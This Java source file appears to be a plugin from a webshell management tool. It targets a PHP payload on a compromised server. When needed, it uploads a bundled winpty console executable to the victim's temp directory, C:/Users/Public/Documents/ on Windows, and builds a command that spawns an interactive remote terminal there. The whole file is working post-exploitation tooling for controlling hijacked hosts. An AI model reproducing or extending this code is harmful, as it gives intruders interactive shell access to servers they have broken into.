package shells.plugins.php;

import core.EasyI18N;
import core.annotation.PluginAnnotation;
import core.ui.component.dialog.GOptionPane;
import shells.plugins.generic.RealCmd;
import shells.plugins.generic.SuperTerminal;
import util.Log;
import util.functions;

@PluginAnnotation(
   payloadName = "PhpDynamicPayload",
   Name = "SuperTerminal",
   DisplayName = "超级终端"
)
public class PSuperTerminal extends SuperTerminal {
   public RealCmd getRealCmd() {
      RealCmd plugin = (RealCmd)this.shellEntity.getFrame().getPlugin("RealCmd");
      if (plugin != null) {
         return plugin;
      } else {
         GOptionPane.showMessageDialog(super.getView(), "未找到HttpProxy插件!", "提示", 0);
         return null;
      }
   }

   public boolean winptyInit(String tmpCommand) throws Exception {
      boolean superRet = super.winptyInit(tmpCommand);
      if (superRet) {
         String winptyFileName = String.format("%swinpty-%s.exe", this.getTempDirectory(), "Console-x" + (this.payload.isX64() ? 64 : 32));
         if (this.payload.getFileSize(winptyFileName) <= 0) {
            Log.log(EasyI18N.getI18nString("上传PtyOfConsole remoteFile->%s"), winptyFileName);
            if (this.payload.uploadFile(winptyFileName, functions.readInputStreamAutoClose(SuperTerminal.class.getResourceAsStream(String.format("assets/winptyConsole-x%d.exe", this.payload.isX64() ? 64 : 32))))) {
               Log.log(EasyI18N.getI18nString("上传PtyOfConsole成功!"));
               String[] commands = functions.SplitArgs(tmpCommand);
               this.realCmdCommand = String.format("%s %s", winptyFileName, commands[1]);
               Log.log(EasyI18N.getI18nString("WinPty 派生命令->%s"), this.realCmdCommand);
               return true;
            }
         } else {
            Log.log(EasyI18N.getI18nString("已有winpty console 无需再次上传"));
         }
      }

      return superRet;
   }

   protected String getTempDirectory() {
      return this.payload.isWindows() ? "C:/Users/Public/Documents/" : super.getTempDirectory();
   }
}
